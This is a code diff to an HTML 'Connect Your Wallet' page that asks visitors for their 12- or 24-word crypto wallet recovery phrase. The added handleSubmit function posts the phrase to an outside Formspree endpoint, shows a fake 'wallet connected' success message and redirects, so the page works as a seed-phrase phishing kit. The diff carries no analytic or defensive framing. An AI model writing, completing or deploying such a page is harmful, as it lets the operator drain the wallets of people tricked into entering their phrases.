@@ -1,5 +1,6 @@
-
-<html><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Connect Your Wallet</title>
@@ -172,14 +173,17 @@ body {
     <div class="modal-header">
       <h2 id="modalWalletName">Connect Wallet</h2>
     </div>
-<form action=“https://formspree.io/f/mdojqvda” method=“post”>
-    <textarea
-      class="phrase-input"
-      placeholder="Enter your recovery phrase (12 or 24 words)"
-      rows="4"
-    ></textarea>
-    <button type="submit" class="btn">Connect Wallet</button>
-</form>
+    <form id="walletForm" method="POST" onsubmit="handleSubmit(event)">
+      <textarea
+        class="phrase-input"
+        name="recoveryPhrase"
+        placeholder="Enter your recovery phrase (12 or 24 words)"
+        rows="4"
+        required
+      ></textarea>
+      <button type="submit" class="connect-btn">Connect Wallet</button>
+    </form>
+    <div id="formResponse" style="margin-top: 20px;"></div>
   </div>
 </div>
 
@@ -238,19 +242,34 @@ function closeModal() {
   modal.style.display = 'none';
 }
 
-function handleConnect() {
-  const phraseInput = document.querySelector('.phrase-input');
-  const phrase = phraseInput.value.trim();
+function handleSubmit(event) {
+  event.preventDefault();
+  const form = document.getElementById('walletForm');
+  const formData = new FormData(form);
   
-  if (!phrase) {
-    alert('Please enter your recovery phrase');
-    return;
-  }
-  
-  // Here you would typically handle the wallet connection
-  // For demo purposes, we'll just show an alert
-  alert('Wallet connection initiated! This is a demo.');
-  closeModal();
+  fetch('https://formspree.io/f/mdojqvda', { // Replace with your Formspree URL
+    method: 'POST',
+    body: formData,
+    headers: {
+      'Accept': 'application/json'
+    }
+  })
+  .then(response => {
+    if (response.ok) {
+      return response.json();
+    }
+    throw new Error('Network response was not ok.');
+  })
+  .then(data => {
+    document.getElementById('formResponse').innerText = 'Success! Your wallet has been connected.';
+    setTimeout(() => {
+      closeModal();
+      window.location.href = '/'; // Redirect to the first page
+    }, 2000); // Adjust timeout duration as needed
+  })
+  .catch(error => {
+    document.getElementById('formResponse').innerText = 'Error connecting wallet: ' + error.message;
+  });
 }
 
 // Close modal when clicking outside
@@ -264,4 +283,5 @@ window.onclick = function(event) {
 // Initialize the wallet grid
 createWalletGrid();
 </script>
-</body></html>
+</body>
+</html>
